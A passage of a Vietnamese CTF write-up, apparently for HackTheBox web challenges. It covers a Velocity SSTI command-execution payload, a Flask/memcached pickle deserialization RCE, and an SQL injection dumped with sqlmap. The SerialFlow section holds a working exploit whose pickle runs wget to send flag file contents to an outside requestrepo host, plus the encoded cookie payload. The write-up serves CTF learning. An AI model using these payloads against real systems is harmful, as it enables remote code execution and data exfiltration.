#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
 ```
- ở đây ta lợi dụng hàm thực thi từ `java.lang.Runtime` để chạy os command và kết quả nhận được
![image](https://hackmd.io/_uploads/HyUGuJ7CT.png)
![image](https://hackmd.io/_uploads/Hy9D_k70a.png)

Flag: `HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}`


## SerialFlow - medium

- Tiếp tục là chall white-box python khác đầu tiên thì mình vào xem source thấy khá là lú thì code khá là ngắn:<
- ![image](https://hackmd.io/_uploads/ryv7MS40T.png)

- Vào trong giao diện thì mình thấy khá là ngầu lòi:

- Bởi vì bài này white-box nên mình khum lan man nữa nha, check source luôn nào !!

* app.py

```
import pylibmc, uuid, sys
from flask import Flask, session, request, redirect, render_template
from flask_session import Session

app = Flask(__name__)

app.secret_key = uuid.uuid4()

app.config["SESSION_TYPE"] = "memcached"
app.config["SESSION_MEMCACHED"] = pylibmc.Client(["127.0.0.1:11211"])
app.config.from_object(__name__)

Session(app)

@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]


@app.errorhandler(Exception)
def handle_error(error):
    message = error.description if hasattr(error, "description") else [str(x) for x in error.args]

    response = {
        "error": {
            "type": error.__class__.__name__,
            "message": message
        }
    }

    return response, error.code if hasattr(error, "code") else 500


@app.route("/set")
def set():
    uicolor = request.args.get("uicolor")

    if uicolor:
        session["uicolor"] = uicolor
    
    return redirect("/")


@app.route("/")
def main():
    uicolor = session.get("uicolor", "#f1f1f1")
    return render_template("index.html", uicolor=uicolor)

```

- Mình làm bài Leader board ở giải braekerCTF thì thấy khá giống nhau mỗi tội bài kia phải brute-force app secret key. 
- Như ta có thể thấy sever config SESSION-Memcache lưu ở cồng `127.0.0.1:11211` bằng thư viện `pylibmc` đôi nét về `pylibmc`:

- Pylibmc là một gói thư viện Python dùng để tương tác với memcached, một hệ thống lưu trữ cache phổ biến. Pylibmc cung cấp các phương thức để kết nối, thao tác và quản lý dữ liệu trong memcached từ Python một cách dễ dàng và hiệu quả. Điều này cho phép các ứng dụng Python tận dụng các tính năng mạnh mẽ của memcached để cải thiện hiệu suất và khả năng mở rộng của họ.

- Có middlerware check nếu session > 86 thì gán lại session với 86 kí tự:
```
@app.before_request
def before_request():
    if session.get("session") and len(session["session"]) > 86:
        session["session"] = session["session"][:86]
```

- Route /set thì sẽ lấy `uicolor` và nếu tồn tại thì gán `session["uicolor"] = uicolor` và route / sẽ lấy giá trị ` uicolor = session.get("uicolor", "#f1f1f1")` và hiển thị màu cho template, nhìn vào thì cũng đoán được lỗi ở thư viện `pylibmc`.
- Google một chút ta ta biết được là có lỗ hổng deserialize trong quá trình giải mã session của python flask.
![image](https://hackmd.io/_uploads/S1IFarNCT.png)

* POC: 

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('ping -c 1 localhost')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'137\r\nset BT_:1337 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get BT_:1337')

    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
```

- Payload này sẽ thực hiện gửi các gói tin trong command os:
- ![image](https://hackmd.io/_uploads/rJyhn9NRp.png)

- Trên đây là hình ảnh gói tin bắt được ở wireshark.
* ATTACK

- Dùng POC trên:

```

import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget http://s6thtnzk.requestrepo.com/$(cat /f*)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'\r\nset session:46db9856-90d1-4661-8935-9c8b4871a2aa 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:46db9856-90d1-4661-8935-9c8b4871a2aa')
    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
print(generate_exploit())

```
- Bởi bì session giới hạn số kí tự nên ta có thể sử dụng như trên.
- Lưu ý là build payload bằng linux hoặc ubuntu.
![image](https://hackmd.io/_uploads/rJKoRcN0a.png)

![image](https://hackmd.io/_uploads/BysH1oNR6.png)

```
"\015\012\163\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141\040\060\040\062\065\071\062\060\060\060\040\067\071\015\012\143\160\157\163\151\170\012\163\171\163\164\145\155\012\160\060\012\050\126\167\147\145\164\040\150\164\164\160\072\057\057\163\066\164\150\164\156\172\153\056\162\145\161\165\145\163\164\162\145\160\157\056\143\157\155\057\044\050\143\141\164\040\057\146\052\051\012\160\061\012\164\160\062\012\122\160\063\012\056\015\012\147\145\164\040\163\145\163\163\151\157\156\072\064\066\144\142\071\070\065\066\055\071\060\144\061\055\064\066\066\061\055\070\071\063\065\055\071\143\070\142\064\070\067\061\141\062\141\141"
```

![image](https://hackmd.io/_uploads/S1Jgxs40p.png)

![image](https://hackmd.io/_uploads/rJKleiNCa.png)

Flag: `HTB{y0u_th0ught_th15_wou1d_b3_s1mpl3?}`



## Korp terminal

- Bài này đầu tiên mình biết là sqli nhưng mà không nghĩ đến dùng sqlmap luôn cho đến khi anh `kev1n` dums được hash pass của admin:
- ![image](https://hackmd.io/_uploads/rkfsZiERp.png)

- Như ta thấy thì đây là một bài black-box.
- Giao diện như thế này:
- ![image](https://hackmd.io/_uploads/SkDgMsERa.png)

- ![image](https://hackmd.io/_uploads/BJZ4Gj4Aa.png)

- Form login nếu sai tài khoản và pass thì trả ra json `{"message":"Invalid user or password"}` 

- Thử thêm `'` vào thì báo lỗi,
- ![image](https://hackmd.io/_uploads/r11gNiN06.png)

- Sqli ở đây rồi nhưng mà sau thời gian dài thì thôi dùng tool:


```
sqlmap --url http://94.237.62.149:58756 --data 'username=admin&password=admin' --ignore-code 401 -v 6 --dump -T users
```

- Sau khi dumb được ra thì đây là một mã hash, ta tiếp tục sử dụng hashcash để giải mã nó và tìm được flag.